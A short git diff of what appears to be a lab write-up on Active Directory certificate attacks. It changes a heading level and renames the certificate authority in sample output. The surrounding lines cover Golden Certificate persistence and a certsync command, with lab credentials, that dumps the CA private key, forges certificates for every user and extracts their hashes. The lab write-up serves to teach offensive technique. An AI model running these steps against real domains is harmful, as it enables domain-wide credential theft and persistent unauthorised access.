@@ -261,7 +261,7 @@ With the machine certificate in hand, the next step is simply to perform an **as
 A characteristic of machines is that their passwords are changed every 30 days, but as we learned in this article about UnPAC, this is no longer a problem for us 🙄.
 
 
-## Golden Certificate persistence
+# Golden Certificate persistence
 
 The Golden Certificate, in essence, is nothing more than the certificate of the CA (Certification Authority), but what can we do with it?
 
@@ -396,7 +396,7 @@ Let's reproduce this in the lab. I will be using my user, which is an administra
 $ certsync -u paulo.victor -p 'Senha@123' -d corp.local -dc-ip 10.0.0.10 -ns 10.0.0.10
 [*] Collecting userlist, CA info and CRL on LDAP
 [*] Found 16 users in LDAP
-[*] Found CA ESSOS-CA on braavos.essos.local(10.0.0.10)
+[*] Found CA CORP-CA on CORP.LOCAL(10.0.0.10)
 [*] Dumping CA certificate and private key
 [*] Forging certificates for every users. This can take some time...
 [*] PKINIT + UnPAC the hashes
